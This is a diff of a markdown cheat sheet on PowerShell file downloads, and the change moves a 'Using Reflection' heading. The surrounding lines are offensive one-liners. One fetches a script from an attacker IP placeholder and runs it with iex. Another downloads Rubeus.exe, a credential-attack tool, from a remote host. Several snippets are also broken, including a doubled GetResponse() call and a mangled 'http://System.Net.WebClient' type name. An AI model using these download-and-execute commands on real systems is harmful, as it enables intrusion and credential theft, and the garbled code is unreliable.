@@ -1,7 +1,5 @@
 # Powershell File Download
 
-## Using Reflection - @Alh4zr3d
-
 ## Classic
 
 ```powershell
@@ -19,6 +17,8 @@ $req = [System.Net.WebRequest]::Create("http://{IPAttacker/script.ps1}")
 $res = $req.GetResponse()
 iex ([System.IO.StreamReader] ($res.GetResponse())).ReadToEnd()
 ```
+
+## Using Reflection - @Alh4zr3d
 
 ```powershell
 $d = (New-Object http://System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')
